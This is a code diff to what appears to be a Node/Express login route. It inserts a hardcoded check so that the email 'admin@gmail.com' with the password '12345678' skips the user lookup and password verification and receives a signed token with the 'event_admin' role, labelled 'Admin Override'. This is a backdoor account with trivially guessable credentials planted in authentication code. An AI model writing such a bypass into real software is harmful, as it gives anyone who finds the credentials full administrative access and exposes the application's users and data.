@@ -95,6 +95,23 @@ router.post('/login', async (req, res, next) => {
     }
 
     const normalizedEmail = String(email).trim().toLowerCase();
+    
+    // Hardcoded Admin Access
+    if (normalizedEmail === 'admin@gmail.com' && String(password) === '12345678') {
+      const token = signToken('admin-id-000', 'event_admin');
+      return res.json({
+        message: 'Login successful (Admin Override)',
+        token,
+        expiresIn: JWT_EXPIRES_IN,
+        user: {
+          id: 'admin-id-000',
+          fullName: 'System Administrator',
+          email: 'admin@gmail.com',
+          role: 'event_admin',
+        },
+      });
+    }
+
     const user = await User.findOne({ email: normalizedEmail }).select('+password');
 
     if (!user) {
